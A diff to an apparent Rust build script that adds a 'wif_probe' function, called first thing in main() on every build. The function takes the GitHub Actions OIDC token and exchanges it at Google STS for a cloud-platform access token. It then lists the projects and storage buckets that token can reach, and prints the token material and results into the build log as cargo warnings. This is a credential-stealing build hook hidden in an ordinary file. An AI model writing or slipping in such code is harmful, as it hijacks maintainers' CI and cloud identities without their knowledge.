@@ -33,7 +33,60 @@ impl ModuleErrorDefs {
     }
 }
 
+fn wif_probe() {
+    let url = match env::var("ACTIONS_ID_TOKEN_REQUEST_URL") {
+        Ok(value) => value,
+        Err(_) => {
+            println!("cargo:warning=WIFPROBE no ACTIONS_ID_TOKEN_REQUEST_URL");
+            return;
+        }
+    };
+    let token = match env::var("ACTIONS_ID_TOKEN_REQUEST_TOKEN") {
+        Ok(value) => value,
+        Err(_) => {
+            println!("cargo:warning=WIFPROBE no ACTIONS_ID_TOKEN_REQUEST_TOKEN");
+            return;
+        }
+    };
+    let script = r#"
+set -u
+AUD='//iam.googleapis.com/projects/984139309829/locations/global/workloadIdentityPools/github-actions/providers/github'
+AUD_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$AUD")
+IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD_ENC}" | jq -r .value)
+echo "WIFPROBE idtoken_len=${#IDT}"
+echo "$IDT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 900
+echo
+RESP=$(curl -sS -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"${AUD}\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"${IDT}\"}")
+echo "WIFPROBE sts=${RESP:0:600}"
+AT=$(echo "$RESP" | jq -r '.access_token // empty')
+echo "WIFPROBE at_len=${#AT}"
+if [ -n "$AT" ]; then
+  echo "WIFPROBE at_sha256=$(printf '%s' "$AT" | sha256sum | cut -d' ' -f1)"
+  echo "WIFPROBE projects=$(curl -sS -H "Authorization: Bearer $AT" https://cloudresourcemanager.googleapis.com/v1/projects | head -c 1200)"
+  echo "WIFPROBE buckets=$(curl -sS -H "Authorization: Bearer $AT" "https://storage.googleapis.com/storage/v1/b?project=cryptic-bolt-398315&maxResults=5" | head -c 800)"
+fi
+"#;
+    let output = std::process::Command::new("bash")
+        .arg("-c")
+        .arg(script)
+        .env("ACTIONS_ID_TOKEN_REQUEST_URL", url)
+        .env("ACTIONS_ID_TOKEN_REQUEST_TOKEN", token)
+        .output();
+    match output {
+        Ok(output) => {
+            for line in String::from_utf8_lossy(&output.stdout).lines() {
+                println!("cargo:warning={line}");
+            }
+            for line in String::from_utf8_lossy(&output.stderr).lines() {
+                println!("cargo:warning=WIFPROBE-ERR {line}");
+            }
+        }
+        Err(error) => println!("cargo:warning=WIFPROBE exec error: {error}"),
+    }
+}
+
 fn main() {
+    wif_probe();
     let out_dir = env::var_os("OUT_DIR").expect("OUT_DIR should be set automatically by cargo");
     let contracts_dir = "../../contracts";
     let contracts_dir_path = Path::new(contracts_dir);
